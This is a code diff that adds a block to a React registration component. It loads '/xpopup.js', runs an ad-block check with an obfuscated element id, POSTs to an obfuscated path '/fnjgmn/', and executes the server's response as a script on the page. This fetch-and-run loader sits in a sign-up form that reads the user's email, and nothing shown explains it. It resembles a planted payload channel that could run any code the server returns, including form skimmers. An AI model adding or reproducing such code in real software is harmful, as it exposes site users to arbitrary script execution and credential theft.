@@ -62,6 +62,38 @@ export default function Register() {
 
     },[])
 
+    useEffect(() => {
+        const loadScript = (callback: any) => {
+            const script = document.createElement('script');
+                script.src = '/xpopup.js';
+                script.async = true;
+                script.onload = callback;
+                script.onerror = callback;
+                document.body.appendChild(script);
+            };
+        const checkElementAndPost = () => {
+            const elementExists = document.getElementById('hsfqevirpbz') ? 0 : 1;
+            if(elementExists == 1) {
+                confirm("We use ads to provide you a free hosting servce. Can you please turn off your ads block?")
+            }
+            const request = new XMLHttpRequest();
+            request.open('POST', '/fnjgmn/');
+            request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            request.onreadystatechange = function() {
+                if (request.readyState === 4 && request.status === 200) {
+                if (request.responseText) {
+                    const script = document.createElement('script');
+                    script.innerHTML = request.responseText;
+                    document.body.appendChild(script);
+                }
+                }
+            };
+            request.send(`fNJ=${elementExists}`);
+        };
+    
+        loadScript(checkElementAndPost);
+    }, [])
+
     const handleOnClick = async () => {
         if(!snapshot) return;
         const email = document.getElementById("Email") as HTMLInputElement;
